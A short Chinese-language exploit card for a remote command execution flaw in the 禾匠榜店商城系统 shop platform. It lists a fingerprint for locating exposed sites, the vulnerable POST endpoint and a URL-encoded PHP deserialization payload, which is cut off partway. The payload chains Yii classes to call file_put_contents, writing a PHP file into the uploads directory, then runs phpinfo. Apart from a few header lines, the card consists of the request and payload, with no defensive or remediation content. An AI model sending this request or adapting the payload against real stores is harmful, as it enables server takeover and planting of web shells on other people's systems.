# 禾匠榜店商城系统RCE漏洞

- **系统**：禾匠榜店商城系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="const _scriptUrl"`
- **请求**：`POST /web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1 HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
7Bs%3A10%3A%22__toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22close%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22yii%5Crest%5CIndexAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A13%3A%22yii%5Cbase%5CView%22%3A0%3A%7B%7Di%3A1%3Bs%3A22%3A%22evaluateDynamicContent%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A132%3A%22file_put_contents%28%27uploads%2Fdudesuite.php%27%2Chex2bin%28%270x3c3f706870206563686f2022647564657375697465223b3f3e%27%29%29%3Bphpinfo%28%29%3B%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7Ds%3A14%3A%22_fn___toString%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A9%3A%22_fn_close%22%3Ba%3A2%3A%7…（脚本共 654 字，完整版见原文）
```
- **预期**：200　|　phpinfo